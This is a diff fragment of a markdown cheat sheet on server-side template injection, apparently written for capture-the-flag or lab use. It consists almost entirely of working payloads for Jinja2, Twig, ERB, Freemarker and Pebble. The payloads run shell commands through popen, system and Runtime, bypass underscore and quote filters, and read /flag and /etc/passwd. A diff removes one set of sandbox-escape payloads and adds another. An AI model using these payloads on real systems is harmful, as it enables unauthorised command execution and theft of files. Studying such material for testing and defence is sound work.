+Jinja2 sandbox:    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+Twig sandbox:      {{ _self.env.registerUndefinedFilterCallback("system") }}{{ _self.env.getFilter("id") }}
 
-<!-- PATT enrichment 2026-03-13 -->
-## PATT Enrichment: Sandbox Escape Techniques
+Jinja2 underscore-blocked:
+  {%set u='%c'|format(95)%}{%set cc=u~u~'class'~u~u%}{%print ''|attr(cc)%}
 
-### Sandbox Escape via Python Class Hierarchy
-When template engines run in restricted/sandboxed mode, traverse Python's MRO to reach OS access:
+Jinja2 quote-blocked (smuggle via request):
+  {%print lipsum|attr(request.args.a)|attr(request.args.b)(request.args.c)|attr(request.args.d)(request.args.e)|attr(request.args.f)()%}
+  ?a=__globals__&b=__getitem__&c=os&d=popen&e=id&f=read
 
-```python
-# Jinja2 sandbox escape — reach subprocess via class hierarchy
-{{ ''.__class__.__mro__[1].__subclasses__() }}
-
-# Find index of subprocess.Popen (varies per Python version)
-{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate() }}
-
-# Alternative: use __builtins__ if accessible
-{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}
-
-# Twig (PHP) sandbox escape
-{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
-
-# Freemarker sandbox escape
-<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id")}
-
-# Pebble (Java) sandbox bypass
-{% set cmd = 'id' %}
-{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke((1).TYPE.forName('java.lang.Runtime').methods[7].invoke(null),cmd.split(' ')) %}
+File read:
+  ERB:        <%= File.read('/flag') %>
+  Jinja2:     {{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
+  Freemarker: ${'java.io.BufferedReader'?new()(java.io.FileReader('/flag')).readLine()}
+  Twig:       {{ source('/flag') }}
 ```
-
-### Bypass Filters (underscore/dot restrictions)
-```python
-# When underscores are filtered
-{{ request|attr('__class__') }}
-{{ request|attr('\x5f\x5fclass\x5f\x5f') }}
 
-# When dots are filtered  
-{{ request['__class__']['__mro__'] }}
-
-# Jinja2 — using |attr filter
-{{ ''|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')() }}
-```
+## References
 
-*Full list: patt-fetcher agent → "SSTI sandbox escape"*
+`ssti-quickstart.md`, `ssti-advanced.md`, `ssti-resources.md`. PayloadsAllTheThings, HackTricks, PortSwigger SSTI labs.
